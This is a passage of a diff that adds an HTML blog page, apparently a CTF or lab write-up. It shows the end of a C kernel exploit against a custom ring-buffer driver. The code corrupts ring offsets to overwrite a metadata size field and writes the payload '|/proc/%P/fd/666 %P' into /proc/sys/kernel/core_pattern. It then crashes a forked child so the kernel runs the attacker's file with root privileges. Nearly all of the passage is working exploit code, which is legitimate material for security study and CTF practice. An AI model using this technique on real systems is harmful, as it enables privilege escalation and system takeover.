+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">mask</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
+  <span class="n">cq2</span><span class="o">-&gt;</span><span class="n">mask</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="n">RING_OP_CREATE</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">MAX_SIZE</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">user_data</span> <span class="o">=</span> <span class="mh">0xdead0003</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">usleep</span><span class="p">(</span><span class="mi">1000000</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Create returned %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">cq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">rc</span><span class="p">);</span>
+  <span class="n">linfo</span><span class="p">(</span><span class="s">"Created and alloced, overwriting the ring_meta size field..."</span><span class="p">);</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">rmeta_ptr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">page_base</span> <span class="o">-</span> <span class="mh">0x180</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span><span class="p">;</span>
+  <span class="n">cq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Offset: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+  
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="n">RING_OP_READ</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">user_data</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  
+  <span class="n">usleep</span><span class="p">(</span><span class="mi">1000000</span><span class="p">);</span>
+  <span class="n">lstage</span><span class="p">(</span><span class="s">"Writing payload to core pattern"</span><span class="p">);</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"|/proc/%P/fd/666 %P"</span><span class="p">;</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="n">rbuf2</span><span class="o">-&gt;</span><span class="n">in_buf</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Payload: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="n">RING_OP_WRITE</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">user_data</span> <span class="o">=</span> <span class="mh">0xdead0004</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  
+  <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Write rc: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">cq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">rc</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Write id: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">cq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">user_data</span><span class="p">);</span>
+
+  <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">core_pattern</span><span class="o">-</span><span class="p">(</span><span class="n">page_base</span><span class="o">+</span><span class="mh">0x8000</span><span class="o">*</span><span class="n">BUF_IDX</span><span class="o">+</span><span class="mh">0x300</span><span class="p">));</span> <span class="c1">// change this aswell </span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Core pattern offset: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="n">RING_OP_READ</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">user_data</span> <span class="o">=</span> <span class="mh">0xdead0005</span><span class="p">;</span>
+  <span class="n">sq2</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  
+  <span class="n">usleep</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Write rc: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cq2</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">cq2</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">rc</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"rbuf2-&gt;out_buf: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rbuf2</span><span class="o">-&gt;</span><span class="n">out_buf</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"cat /proc/sys/kernel/core_pattern"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">SYSCHK</span><span class="p">(</span><span class="n">fork</span><span class="p">())</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span> <span class="o">=</span> <span class="mi">1337</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+</div><footer class="flex flex-col centered mb-3 grey5 text-m mt-12">
+  <div class="flex align-center ">
+    <span>Github</span>
+    <hr class="no-margin dotted-hor ml-1">
+    <a  class="ml-1 orange underline hover:text-red transition-colors" href="https://github.com/MatusMandzak">@MatusMandzak</a>
+  </div>
+  <div class="flex align-center ">
+    <span>Email</span>
+    <hr class="no-margin dotted-hor ml-1">
+    <p class="ml-1 orange">mandzak.matus&lt;at&gt;proton.me</p>
+  </div>
+</footer>
+</div>
+  </body>
+</html>
